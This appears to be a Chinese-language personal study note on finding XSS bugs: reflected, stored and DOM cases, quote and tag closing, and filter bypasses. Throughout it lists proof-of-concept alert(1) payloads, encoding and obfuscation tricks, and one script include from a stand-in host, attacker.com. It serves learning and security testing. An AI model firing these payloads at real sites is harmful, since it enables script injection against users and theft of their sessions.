# XSS漏洞挖掘

> 忽略引用中我的吐槽

   - [XSS漏洞挖掘](#xss漏洞挖掘)
      - [XSS的分类](#xss的分类)
         - [反射型XSS挖掘](#反射型xss挖掘)
         - [存储型XSS挖掘](#存储型xss挖掘)
         - [DOM XSS挖掘](#dom-xss挖掘)
            - [页面跳转](#页面跳转)
            - [取值写入页面or动态执行](#取值写入页面or动态执行)
      - [闭合问题](#闭合问题)
         - [HTML标签中](#html标签中)
         - [HTML属性中](#html属性中)
         - [URL中](#url中)
         - [script标签中](#script标签中)
      - [XSS漏洞挖掘总结](#xss漏洞挖掘总结)
      - [混淆和绕过](#混淆和绕过)
         - [基本变形](#基本变形)
         - [事件属性](#事件属性)
         - [分隔符和括号](#分隔符和括号)
         - [标签名分隔符](#标签名分隔符)
         - [JS编码](#js编码)
         - [HTML编码](#html编码)
      - [Reference](#reference)

常用的测试payload

```html
"'><svg/onload=alert(1)//
```

> 为啥前面要有一个单引号一个双引号啊



## XSS的分类

### 反射型XSS挖掘

反射型xss测试payload

```http
?name=<h1>amber&age=1
?name=amber&age=<h1>
```

在网页源码中查找amber并查看`h1`的`<`是否被转义。

`< >`符号未被转义，则将参数换成svg。

**payload的进一步构造**

若`<svg>`在源代码中存在，再添加内联事件执行语句

```html
<svg/onload=alert(1)>
```

`onload`是指在加载该页面时执行，然后观察是否有弹窗。

### 存储型XSS挖掘

存储型XSS简单分类

<img src="https://upload-images.jianshu.io/upload_images/8581772-5eae8e59c36e6986.png?imageMogr2/auto-orient/strip" width=60%>

在burp中发送payload。

```html
<a href="javascript:alert(1)">click</a>
Data URI，仅限 Firefox 下可以利用：
<a href="data:text/html,<script>alert(1)</script>">click</a>
JS URI：
<embed src=javascript:alert(1)>
```

存储型XSS挖掘总结

<img src="https://upload-images.jianshu.io/upload_images/8581772-92090d836dac355d.png?imageMogr2/auto-orient/strip" width=60%>

### DOM XSS挖掘

不同于普通xss，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码不在返回页面的源码中回显，这就使得我们无法通过匹配特征来检测DOM XSS

```html
<script>
	eval(location.hash.substr(1));
</script>
```

触发XSS的一种方式如下:
`http://www.foo.com/xss.html#alert(1)`
这个URL显然不会发送到服务端，仅仅是在客户端被接收并解析执行。

#### 页面跳转

页面跳转常用的三种方式：

```
1. 302跳转
2. Meta标签跳转
3. 通过JS跳转，使用location.href、location.replace()、location.assign()
```

在页面跳转时，如果使用第三种方式跳转，那么就可以通过javascript伪协议执行JS脚本。

注意前两种跳转方式是无法执行的。所以在页面跳转时针对跳转URL要做检测，否则就容易造成XSS。

例如：

```html
<script type="text/javascript">
	var s = location.search;
  s = s.substring(1, s.length)
  var url="";
  
  if(s.indexOf("url=")>-1){
    var pos = s.indexOf("url=")+4;
    url = s.substring(pos, s.length);
    location.href = url;
  }
</script>
```

payload:`http://192.168.192.120/1.html?url=javascript:alert(1)`

#### 取值写入页面or动态执行

接受用户输入， 并通过DOM操作写入到当前页面or动态执行，也可触发XSS。

```html
// user_input = "<img/src='x' onerror=alert(1)>"
<html>
  <head>
    <body>
      <div id='text'>test</div>
      <div id="html">html</div>
      <script>
      	document.getElementById('html').innerHTML = "{user_input}";
      </script>
    </body>
  </head>
</html>
```

**DOM XSS输入点**

| location         | 当前网页的URL地址                                            |
| ---------------- | ------------------------------------------------------------ |
| Window.name      | 当前网页的tab名字，它被不同的网站赋值，也即这个网页为window.name赋值后再跳转到其他网站，window.name的值依旧不变 |
| Document.title   | 当前网页的标题，可在搜索框输入来控制它的名字                 |
| Document.referer | 表示来路，表示从哪个网页URL访问过来的                        |
| postMessage      | 是HTML5 的一种跨域机制，但很多时候开发者没有正确的做来源检测，会导致 DOM XSS 的发生 |
| Location         | 它触发 JS 通常是以跳转到 JS URI 的方式执行                   |
| Eval             | 是JS 内置的动态JS执行器                                      |
| innerHTML        | 能为一个网页元素赋值                                         |
| document.write   | 可以输出一个页面流                                           |
| Function         | 能通过函数生成一个函数，可以传入动态JS代码                   |
| setTimeout       | 会延时执行JS代码                                             |
| setInterval      | 表示循环执行 JS 代码                                         |

> 这个看起来像sink函数
>
> 只要这些个东西里接收了用户输入，可能就会存在问题
>
> 那我是不是只要，逆向跟踪这些函数，看他们是否可以回溯到用户输入即可

## 闭合问题

**引号、尖括号闭合说明**

假设输入框源码：`<input type="text" name="2sec" value="[?]"`*(其中value中的[?]是可输入部分)*

Payload1:

```html
<!--value=-->
" "autofocus/onfocus=alert(1)//
<!--result-->
<input type="text" name = "2sec" value = "" autofocus/onfocus=alert(1)//">
```

Payload2:

```html
// value=
" "><sgv onload=alert("XSS")//
```

### HTML标签中

HTML标签下的XSS时一种最常见的情况，例如：

```html
<!DOCTYPE HTML>
<html>
<head>
<title>HTML Context</title>
</head>
<body>
{{用户输入}}
</body>
</html>
```

可使用一下payloads：

```html
<script src=//attacker.com/eval.js></script>
<script>alert(1)</script>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
```

为了注入JS代码成功，我们需要闭合前面的HTML标签，然后使用`<svg onload=alert(1)//` 类似payload 就可以成功XSS。

但是有些html标签中不执行js代码，例如：`<title>, <textarea >,<xmp>`都需要使用`</title><script>alert(1)</script>` 先闭合标签，再插入JS代码。

### HTML属性中

用户的输入是在html标签的属性当中时，如何来执行JS代码？会有三种情况：

- 单引号
- 双引号
- 无引号

```html
<html>
<body>
.....
...
<input type="" name="input" value="{{用户输入}}"> <!-- 双引号 -->
<input type="" name="input" value='{{用户输入}}'> <!-- 单引号 -->
<input type="" name="input" value={{用户输入}}> <!-- 无引号 -->
...
....
</body>
</html>
```

1. 双引号payloads

   ```html
   "autofocus onfocus="alert(1)
   "autofocus onfocus=alert(1)//
   "onbeforescriptexecute=alert(1)//
   "onmouseover="alert(1)//
   "autofocus onblur="alert(1)
   ```

2. 单引号payloads

   ```html
   'autofocus onfocus='alert(1)
   'autofocus onfocus=alert(1)//
   'onbeforescriptexecute=alert(1)//
   'onmouseover='alert(1)//
   'autofocus onblur='alert(1)
   ```

3. 无引号payloads

   ```html
   autofocus onfocus=alert(1)//
   onbeforescriptexecute=alert(1)//
   onmouseover=alert(1)//
   ```

4. hidden标签

   在`onclick`事件下，使用accessKey

   ```html
   <html>
   ..
   <input type="hidden" value="{{用户输入}}" />
   ..
   </html>
   ```

   Payload：`"accesskey="X" onclick="alert(1)"`，为了触发事件，需要按Alt+X 键。

   > 这个accessKey时用来干嘛？——accessKey 属性可设置或返回访问单选按钮的快捷键。
   >
   > 就是我要触发这个hidden按钮，可以通过alt+X快捷键来代替鼠标点击
   >
   > mac下是啥。。。

### URL中

使用了加载URL的标签

```html
<script src="{}"></script>
<a href="{}">Click</a>
<iframe src="{}" />
<base href="{}">
<form action={}>
<button>X</button>  
<frameset><frame src="{}"></frameset>
```

Payload：`javascript:alert(1)//`

> 1，4，7没有弹框

### script标签中

用户的输入在`<script>` 标签中，从而导致的JS代码执行

1. 一例

```html
<html>
  <script>
    var x = "{{user_input}}";
    ...
  </script>
</html>
```

Payloads：

```
";alert(1)//
"-alert(1)-"
"+alert(1)+"
"*alert(1)*"
```

2. 一例

```html
<html>
  <script>
  var x=123;
  function test(){
      if(test =='{{用户输入}}'){
          //something
      }
      else
      {
      //something
      }
  }
  test();
  </script>
</html>
```

首先用 `test'){//` 封闭条件判断的地方，变成：

```js
function test(){
  if(test == 'test'){//' ){
    // ...
  }else{
    // ...
  }
}
```

但是这样只有在调用test()才能执行，所以我们要跳出这个函数输入：`test'){1}}//` 封闭test()函数：

```javascript
function test(){
    if(test =='test'){1}}//'){
    //something
    }
    else
    {
    //something
    }
}
```

我们在使用`test'){1}};alert(1);function test1(){ if(1){//` 把对应的test位置替换下，利用test1 来封闭剩下的函数，但是这样执行会有错误，我们使用ES6的箭头函数来替代`function` :

```javascript
function test(){
    if(test =='test'){1}};alert(1);test1=>{ if(1){//'){1}}//'){
    //something
    }
    else
    {
    //something
    }
}
```

**未设置过滤情况下使用script标签闭合**

```html
<script>var website="  http://xxx.com"</script><script>alert(1)//  ";</script>
```

**双引号绕过`<`过滤**

```html
<script>var website="http://www.xxx.com/"-alert(1)//";</script>
```

`-alert(1)//"`中，减号用于：让js语句不发生错误

*(+，在 url 的 uqery 中是空格的编码，而 % 号是表示url编码的标识符，/号在url中是表示一个path，所以用减号最合适。)*

**使用换行符跳过注释**

```html
<script>//var website="http://www.xxx.com/
		alert(1)// ";</script>
```

**多行注释绕过**

```html
<script>/*var website="http://www.xxx.com/  */alert(1)//  ";*/</script>
```

**利用html编码闭合单引号**

在html编码中:

```
单引号：
- 命名编码：&apos;
- 十进制编码：&#39;
- 十六进制编码：&#x27;
```

> 这个可以用来闭合单引号吗？ 就算闭合了，它的使用场景到底又是什么？

## XSS漏洞挖掘总结

<img src="https://upload-images.jianshu.io/upload_images/8581772-27c983794cfb69d8.png?imageMogr2/auto-orient/strip" width=60%>

## 混淆和绕过

### 基本变形

最简单的XSS的payload

```html
<script>alert(1)</script>
```

如果测试的参数存在XSS，就会弹窗显示1

这个payload肯定会被过过滤，可以对payload进行简单修改，绕过默认的filter。

```html
<!--在script标签钟插入一个空格或者是tab-->
<script >alert(1)</script>
<script    >alert(1)</script>

<!--也可以对tab，换行，回车进行编码来绕过-->
<script&#9>alert(1)</script>
<script&#10>alert(1)</script>
<script&#13>alert(1)</script>

<!--对标签进行大小写-->
<ScRipT>alert(1)</sCriPt>

<!--插入null字节，在xss payload的任何地方插入null字节，有时候可以绕过filter-->
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
```

### 事件属性

```html
<input autofocus onfocus=alert(1)> 
<input onblur=alert(1) autofocus><input autofocus> 
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```

> 这段payload没太看懂



### 分隔符和括号

分隔符是用于分隔文本字符串或者其他数据流的一个或多个字符。在挖xss漏洞时，巧妙的使用分隔符非常有效。在HTML中，我们经常使用空格来分隔属性和它的值。还有的时候，只要使用一个单引号或者双引号作为分隔符就可以绕过filter了，如下：

```html
<img onerror="alert(1)"src=x>
<img onerror='alert(1)'src=x>

// 对分隔符进行编码也可以用来绕过防御
<img onerror=&#34alert(1)&#34src=x>
<img onerror=&#39alert(1)&#39src=x>
```

反引号也是绕过filter的一种不错的技巧

```html
<img onerror=`alert(1)`src=x>
// 编码版本如下：
<img onerror=&#96alert(1)&#96src=x>
```

Filter有时候会过滤某些关键词，比如以“on”开头的事件处理器，以此来防御此类xss攻击。

如果我们把属性的位置换到前面，filter无法识别反引号，就不会将之视为“on”开头的单独的属性，这样也就可以有效绕过filter了，如下：

```html
<img src=`x`onerror=alert(1)>
```

跟分隔符一样，尖括号也可以利用来绕过filter。在某些情况下，filter仅仅只会查找开始括号和闭合括号，然后将尖括号里面的内容与恶意标签黑名单比较。通过使用多个尖括号，有时候可以骗过filter接受后面的代码。再使用双斜线注释掉后面的闭合标签，所以也不会报错，如下：

```html
<<script>alert(1)//<</script>

// 还有时候在结束的地方使用开尖括号也有可能绕过filter
<input onsubmit=alert(1)<
```

> 1我没理解，它的场景又是什么？

### 标签名分隔符

```html
<img/onerror=alert(1) src=a>
<img[0x09]onerror=alert(1) src=a>
<img[0x0d]onerror=alert(1) src=a>
<img[0x0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(a) src=a>
```

### JS编码

```javascript
a\u006cert(1);
alert`1`;
location=/javascript:alert%281%29/.source;
```

### HTML编码

```html
<a href="javascsipt:alert(1)">click</a>
```



## Reference

- [简书-XSS漏洞挖掘](https://www.jianshu.com/p/13f0b9a15e46)

